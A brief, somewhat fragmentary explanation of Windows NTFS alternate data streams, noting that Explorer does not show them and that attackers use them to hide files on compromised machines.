This is not a well known feature and was included
Alternate data streams allow files to contain more than one stream of data. Every file has at least one data stream. In Windows, this default data stream is called :$DATA.

Windows Explorer doesn’t provide a way of seing what alternate data streams are in a file (or a way to remove them without deleting the file) but they can be created and accessed easily. Because they are difficult to find they are often used by hackers to hide files on machines that they’ve compromised (perhaps files for a rootkit).

but they will not show up in Windows Explorer (or the Console).
